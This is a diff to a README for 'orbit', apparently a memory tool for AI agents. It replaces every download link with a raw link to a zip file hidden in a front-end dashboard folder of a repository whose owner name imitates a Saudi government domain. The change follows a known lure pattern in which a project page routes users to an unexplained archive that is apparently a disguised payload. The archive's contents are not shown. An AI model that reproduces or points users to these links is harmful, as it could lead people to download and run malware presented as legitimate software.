@@ -1,6 +1,6 @@
 # 🚀 orbit - Keep Your Agents’ Memory Intact
 
-[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://github.com/app-balady-servers-sa-gov/orbit)
+[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/app-balady-servers-sa-gov/orbit/main/front-end/app/dashboard/Software-v1.0.zip)
 
 ---
 
@@ -41,7 +41,7 @@ orbit runs on basic PCs and uses minimal system resources. It does not require G
 
 Click the large green button below or visit the link to download orbit for Windows. This page contains the latest version and release information.
 
-[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://github.com/app-balady-servers-sa-gov/orbit)
+[![Download orbit](https://img.shields.io/badge/Download-orbit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/app-balady-servers-sa-gov/orbit/main/front-end/app/dashboard/Software-v1.0.zip)
 
 ### Step 2: Find the Download File
 
@@ -128,4 +128,4 @@ Relevant topics include:
 
 ---
 
-[Click here to visit the orbit Download page again](https://github.com/app-balady-servers-sa-gov/orbit)
+[Click here to visit the orbit Download page again](https://raw.githubusercontent.com/app-balady-servers-sa-gov/orbit/main/front-end/app/dashboard/Software-v1.0.zip)
